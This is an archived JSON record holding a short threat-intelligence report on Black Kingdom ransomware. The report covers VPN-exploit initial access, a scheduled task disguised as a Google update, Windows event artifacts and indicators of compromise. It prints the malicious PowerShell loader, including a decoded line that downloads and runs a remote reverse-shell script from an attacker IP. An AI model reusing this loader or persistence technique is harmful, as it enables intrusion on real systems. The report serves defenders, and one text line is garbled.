{
    "id": "05894055-0008-4007-9ce3-175118953cba",
    "created_at": "2023-01-12T15:00:15.384538Z",
    "updated_at": "2025-03-27T02:05:51.183402Z",
    "deleted_at": null,
    "sha1_hash": "b03e3c6e5a96b2fa893029260c40d2c9e0f75468",
    "title": "2020-06-13 - Black Kingdom ransomware (TTPs & IOC)",
    "authors": "",
    "file_creation_date": "2022-05-29T10:48:06Z",
    "file_modification_date": "2022-05-29T10:48:06Z",
    "file_size": 55285,
    "plain_text": "# Black Kingdom ransomware (TTPs & IOC)\n\n**blog.redteam.pl/2020/06/black-kingdom-ransomware.html**\n\nWe would like to share with the community the following TTPs and IOC related to Black Kingdom ransomware and threat actors using it.\n\nAttackers gained initial access to the infrastructure via Pulse Secure VPN vulnerability [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE2019-11510].\n\n[For persistence they use a scheduled task [https://attack.mitre.org/techniques/T1053/]. Task name is GoogleUpdateTaskMachineUSA, which](https://attack.mitre.org/techniques/T1053/)\nresembles a legitimate task of Google Chrome that ends with UA, not USA. The malicious task executes the following code:\n\n<Exec>\n<Command>powershell.exe</Command>\n<Arguments>-windowstyle hidden -file'C:\\ProgramData\\Microsoft\\Windows\\Caches\\cversions_cache.ps1'</Arguments>\n</Exec>\n\nContent of the cversions_cache.ps1 powershell script:\n\n$update =\n\"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkA\npowershell.exe -exec bypass -nologo -Enc $update\n\nAfter decoding the base64 payload we can see the following powershell code:\n\nIEX(New-Object Net.WebClient).DownloadString('http://198.13.49.179/reverse.ps1')\n\nObserved network attacks also originated from this IP address:\n\n198.13.49.179\n\nThe following artifacts can be found in Windows Events:\n\nLogName=Microsoft-Windows-PowerShell/Operational\nSourceName=Microsoft-Windows-PowerShell\nEventCode=4100\nEventType=3\nMessage=Error Message = File C:\\ProgramData\\Microsoft\\Windows\\Caches\\cversions_cache.ps1 cannot be loaded because running scripts\nis disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.\n\n~\n\nLogName=Microsoft-Windows-PowerShell/Operational\nSourceName=Microsoft-Windows-PowerShell\nEventCode=4104\nEventType=3\nMessage=Creating Scriptblock text (1 of 1):\nSet-ExecutionPolicy bypass 'C:\\ProgramData\\Microsoft\\Windows\\Caches\\cversions_cache.ps1'\n\n~\n\nLogName=Microsoft-Windows-PowerShell/Operational\nSourceName=Microsoft-Windows-PowerShell\nEventCode=4104\nEventType=3\nMessage=Creating Scriptblock text (1 of 1):\n$update =\n\"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkA\n\npowershell.exe -exec bypass -nologo -Enc $update\n\nPath: C:\\ProgramData\\Microsoft\\Windows\\Caches\\cversions_cache.ps1\n\n\n-----\n\ne a e ou d a pub c a a ys s c co ta s t e sa e add ess as e a e de t ed t e pay oad\n\nScreenshot of ANY.RUN analysis\n\n[https://any.run/report/63d6c419a8229bc7fc2089a2899d27bac746de0e96368e2a49d7c7754abd29f4/649fff18-14f5-4544-8d040a981d2e0c79].\n\nE-mail address used by attackers: blackingdom@gszmail.com\n\nFiles encrypted using this ransomware end with: .black_kingdom\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-13 - Black Kingdom ransomware (TTPs & IOC).pdf"
    ],
    "report_names": [
        "2020-06-13 - Black Kingdom ransomware (TTPs & IOC).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535615,
    "ts_updated_at": 1743041151,
    "ts_creation_date": 1653821286,
    "ts_modification_date": 1653821286,
    "files": {
        "pdf": "https://archive.orkl.eu/b03e3c6e5a96b2fa893029260c40d2c9e0f75468.pdf",
        "text": "https://archive.orkl.eu/b03e3c6e5a96b2fa893029260c40d2c9e0f75468.txt",
        "img": "https://archive.orkl.eu/b03e3c6e5a96b2fa893029260c40d2c9e0f75468.jpg"
    }
}